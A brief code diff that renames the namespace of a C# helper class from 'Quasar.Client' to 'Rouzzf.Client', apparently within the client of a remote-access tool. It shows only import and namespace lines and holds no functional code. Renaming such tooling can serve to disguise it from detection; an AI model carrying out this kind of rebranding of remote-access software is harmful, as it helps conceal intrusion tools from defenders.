@@ -1,10 +1,10 @@
-﻿using Quasar.Client.Utilities;
+﻿using Rouzzf.Client.Utilities;
 using System;
 using System.Drawing;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace Quasar.Client.Helper
+namespace Rouzzf.Client.Helper
 {
     public static class NativeMethodsHelper
     {
